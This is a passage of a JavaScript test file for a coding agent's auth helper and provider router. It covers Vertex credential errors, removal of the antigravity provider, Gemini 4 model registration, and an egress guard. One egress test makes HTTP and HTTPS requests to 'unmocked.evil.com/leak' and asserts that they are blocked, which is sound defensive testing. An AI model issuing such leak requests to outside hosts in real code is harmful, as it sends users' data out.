    JSON.stringify({ operation: "login", operation_id: "op-vertex-missing-adc", provider: "google-vertex" }),
    async (event) => {
      if (event.prompt.placeholder === "my-gcp-project") return "test-proj";
      return "us-central1";
    },
    { HOME: home, authPath, GOOGLE_APPLICATION_CREDENTIALS: nonExistentAdc }
  );

  assert.equal(result.exitCode, 1);
  const terminal = result.events.find((e) => e.type === "terminal");
  assert.ok(terminal);
  assert.equal(terminal.status, "failed");
  assert.match(terminal.error, /Host Application Default Credentials not found/i);
  assert.match(terminal.error, /gcloud auth application-default login/i);
});

test("Preload guards ESM named imports of node:http and node:https via syncBuiltinESMExports", async () => {
  const child = spawn(process.execPath, [
    "--import", DEFAULT_PRELOAD,
    "-e", `
      import assert from "node:assert/strict";
      import { request as httpsRequest, get as httpsGet } from "node:https";
      import { request as httpRequest, get as httpGet } from "node:http";

      // 1. Named import httpsRequest to external host must emit EgressBlocked error
      let httpsBlocked = false;
      await new Promise((resolve) => {
        const req = httpsRequest("https://unmocked.evil.com/leak", () => {});
        req.on("error", (err) => {
          assert.match(err.message, /EgressBlocked/);
          httpsBlocked = true;
          resolve();
        });
      });
      assert.equal(httpsBlocked, true, "named httpsRequest must be guarded");

      // 2. Named import httpRequest to external host must emit EgressBlocked error
      let httpBlocked = false;
      await new Promise((resolve) => {
        const req = httpRequest("http://unmocked.evil.com/leak", () => {});
        req.on("error", (err) => {
          assert.match(err.message, /EgressBlocked/);
          httpBlocked = true;
          resolve();
        });
      });
      assert.equal(httpBlocked, true, "named httpRequest must be guarded");
    `,
  ], {
    env: { PATH: process.env.PATH },
    stdio: ["pipe", "pipe", "pipe"],
  });

  let stderr = "";
  child.stderr.on("data", (d) => { stderr += d; });
  const exitCode = await new Promise((r) => child.once("close", r));
  assert.equal(exitCode, 0, `child failed with stderr: ${stderr}`);
});






test("Antigravity removal rejects login and logout without credential mutation", async () => {
  const home = await mkdtemp(join(tmpdir(), "auth-removal-"));
  const authPath = join(home, "auth.json");
  const credentials = JSON.stringify({ antigravity: { type: "oauth", access: "inert", refresh: "inert" } });
  await writeFile(authPath, credentials, { mode: 0o600 });
  for (const operation of ["login", "logout"]) {
    const result = await runHelper(JSON.stringify({ operation, operation_id: "removed-" + operation, provider: "antigravity" }) + "\n", { HOME: home, authPath });
    assert.notEqual(result.exitCode, 0);
    assert.equal(await readFile(authPath, "utf8"), credentials);
  }
  const result = await runHelper(JSON.stringify({ operation: "models" }) + "\n", { HOME: home, authPath });
  assert.equal(result.exitCode, 0, result.stderr);
  const snapshot = JSON.parse(result.stdout.trim());
  assert.deepEqual(snapshot.providers.map(p => p.provider).sort(), ["cursor", "google", "google-vertex", "openai-codex"]);
  assert.equal(snapshot.models.some(m => m.provider === "antigravity"), false);
  assert.equal(await readFile(authPath, "utf8"), credentials);
});

test("Google and Vertex providers register Gemini 4 models (argon, carbon, hydrogen) with full configuration", async () => {
  const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
  const { useRouterOwnedCodex, registerGoogleProvider, registerVertexAdcProvider } = await import("./providers.mjs");

  const home = await mkdtemp(join(tmpdir(), "gemini4-models-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  const runtime = await ModelRuntime.create({
    authPath,
    modelsPath: null,
    refreshOnCreate: false,
    allowModelNetwork: false,
  });
  useRouterOwnedCodex(runtime);
  registerGoogleProvider(runtime);
  registerVertexAdcProvider(runtime);

  const expectedGemini4 = [
    { id: "gemini-4-argon", name: "Gemini 4 Argon" },
    { id: "gemini-4-carbon", name: "Gemini 4 Carbon" },
    { id: "gemini-4-hydrogen", name: "Gemini 4 Hydrogen" },
  ];

  for (const providerId of ["google", "google-vertex"]) {
    const provider = runtime.getProvider(providerId);
    assert.ok(provider, `provider ${providerId} must exist`);
    const models = provider.getModels ? provider.getModels() : provider.models;
    assert.ok(Array.isArray(models), `models for ${providerId} must be an array`);

    for (const expected of expectedGemini4) {
      const model = models.find((m) => m?.id === expected.id);
      assert.ok(model, `${providerId} must contain ${expected.id}`);
      assert.equal(model.name, expected.name);
      assert.equal(model.provider, providerId);
      assert.equal(model.contextWindow, 1048576);
      assert.equal(model.maxTokens, 65536);
      assert.equal(model.reasoning, true);
      assert.equal(model.thinkingLevelMap.low, "low");
      assert.equal(model.thinkingLevelMap.medium, "medium");
      assert.equal(model.thinkingLevelMap.high, "high");
      assert.deepEqual(model.cost, { input: 0.75, output: 3.75, cacheRead: 0.075, cacheWrite: 0 });
    }
  }
});
